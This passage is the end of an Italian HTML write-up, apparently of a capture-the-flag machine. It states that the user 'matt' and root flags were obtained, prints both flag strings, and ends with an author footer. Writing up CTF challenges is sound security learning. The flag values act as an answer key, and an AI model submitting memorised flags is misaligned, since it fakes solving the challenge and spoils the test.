In questo modo si è riusciti a leggere sia il flag dell'utente <b>matt</b> che di <b>root</b>.
</p>
</div>
<div id="outline-container-sec-" class="outline-4">
<h4 id="sec-">User flag (matt)</h4>
<div class="outline-text-4" id="text-">
<p>
7e328d9b93d565137e31e20fd9fce3ba
</p>
</div>
</div>

<div id="outline-container-sec-" class="outline-4">
<h4 id="sec-">Root flag</h4>
<div class="outline-text-4" id="text-">
<p>
a9b01cfbe3319261c595c841b3acece2
</p>
</div>
</div>
</div>
</div>
</div></div></div>
<footer id="postamble" class="">
<div><p class="date">Date: 22/04/2022</p>
<p class="author">Author: Andrea Pepe</p>
<p class="date">Created: 2022-04-23 sab 01:55</p>
<p class="creator"><a href="http://www.gnu.org/software/emacs/">Emacs</a> 27.1 (<a href="http://orgmode.org">Org-mode</a> 9.3)</p>
</div>
</footer>
</body>
</html>
